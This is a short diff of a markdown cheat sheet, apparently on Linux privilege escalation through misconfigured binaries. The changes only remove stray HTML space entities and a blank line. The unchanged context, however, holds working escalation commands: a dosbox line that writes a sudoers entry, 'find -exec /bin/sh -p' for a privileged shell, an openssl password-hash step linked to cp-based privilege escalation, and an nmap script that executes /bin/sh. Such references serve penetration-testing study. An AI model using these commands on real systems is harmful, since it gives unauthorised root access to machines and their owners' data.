@@ -22,9 +22,9 @@ $ dosbox -c 'mount c /etc' -c 'echo test ALL=(ALL) ALL >> C:\sudoers' -c exit
 find . -exec /bin/sh -p \; -quit
 ```
 
-### cp&#x20;
+### cp
 
-[https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/)&#x20;
+[https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/](https://www.hackingarticles.in/linux-for-pentester-cp-privilege-escalation/)
 
 ```
 $ openssl passwd -1 -salt ignite pass123
@@ -61,4 +61,3 @@ $ nmap --script=$TF
 $ echo 'os.execute("/bin/sh")' > /tmp/x.nse
 $ nmap --script /tmp/x.nse
 ```
-
